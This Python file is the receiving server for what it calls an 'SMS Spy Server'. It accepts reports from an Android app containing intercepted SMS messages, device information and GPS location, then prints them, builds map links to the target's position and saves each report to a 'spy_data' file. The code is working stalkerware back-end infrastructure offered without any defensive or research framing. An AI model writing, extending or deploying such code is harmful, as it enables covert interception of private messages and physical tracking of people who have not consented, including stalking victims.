from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from datetime import datetime
import re

class SMSRequestHandler(BaseHTTPRequestHandler):
    
    def do_POST(self):
        # Get content length
        content_length = int(self.headers.get('Content-Length', 0))
        
        # Read POST data
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Parse the data
        parsed_data = urllib.parse.parse_qs(post_data)
        
        # Extract SMS text
        sms_text = parsed_data.get('smstext', [''])[0]
        
        print("\n" + "="*60)
        print(f"📱 COMPLETE DATA RECEIVED - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*60)
        
        # Parse and display each section clearly
        self.parse_and_display_data(sms_text)
        
        print("="*60)
        
        # Send response back to Android app
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Data received successfully")
        
        # Save to file
        self.save_to_file(sms_text)
    
    def parse_and_display_data(self, data):
        """Parse the data and display each section clearly"""
        
        # Extract SMS info
        sms_match = re.search(r'=== SMS INTERCEPT ===(.*?)=== DEVICE INFO ===', data, re.DOTALL)
        if sms_match:
            sms_section = sms_match.group(1).strip()
            print("📨 SMS DETAILS:")
            for line in sms_section.split('\n'):
                if line.strip():
                    print(f"   {line}")
            print()
        
        # Extract Device info
        device_match = re.search(r'=== DEVICE INFO ===(.*?)=== LOCATION ===', data, re.DOTALL)
        if device_match:
            device_section = device_match.group(1).strip()
            print("📱 DEVICE INFO:")
            for line in device_section.split('\n'):
                if line.strip():
                    print(f"   {line}")
            print()
        
        # Extract Location info - THIS IS WHAT YOU WANT!
        location_match = re.search(r'=== LOCATION ===(.*?)$', data, re.DOTALL)
        if location_match:
            location_section = location_match.group(1).strip()
            print("📍 LOCATION DATA:")
            
            # Check if we have actual coordinates
            if "Location: " in location_section:
                location_line = location_section.split('\n')[0]  # Get first line
                print(f"   {location_line}")
                
                # Extract coordinates if available
                coords_match = re.search(r'Location: ([\d\.-]+),([\d\.-]+)', location_section)
                if coords_match:
                    lat = coords_match.group(1)
                    lon = coords_match.group(2)
                    print(f"   🌐 Google Maps: https://maps.google.com/?q={lat},{lon}")
                    print(f"   📍 OpenStreetMap: https://www.openstreetmap.org/?mlat={lat}&mlon={lon}")
            else:
                print(f"   {location_section}")
            print()
        
        # If parsing fails, show raw data
        if not (sms_match and device_match and location_match):
            print("📄 RAW DATA (parsing failed):")
            print(data)
    
    def do_GET(self):
        # Handle GET requests (for testing)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html = """
        <html>
        <head><title>SMS Spy Server</title></head>
        <body>
            <h1>📱 SMS Spy Server is Running!</h1>
            <p>Ready to receive SMS + Device Info + Location data</p>
            <p>Check console for parsed information</p>
        </body>
        </html>
        """
        self.wfile.write(html.encode('utf-8'))
    
    def save_to_file(self, data):
        """Save received data to a file"""
        try:
            timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
            filename = f"spy_data_{timestamp}.txt"
            
            with open(filename, "w", encoding="utf-8") as f:
                f.write(data)
            
            print(f"💾 Data saved to: {filename}")
            
        except Exception as e:
            print(f"Error saving to file: {e}")
    
    def log_message(self, format, *args):
        # Custom log format - less verbose
        pass  # Remove this line if you want to see client connections

def run_server(port=8000):
    server_address = ('', port)
    httpd = HTTPServer(server_address, SMSRequestHandler)
    
    print(f"🚀 SMS Spy Server started!")
    print(f"📡 Listening on port {port}")
    print(f"📍 Will parse and display LOCATION data clearly")
    print(f"💾 Each report saved to separate file")
    print("Press Ctrl+C to stop the server\n")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Server stopped")

if __name__ == '__main__':
    run_server()
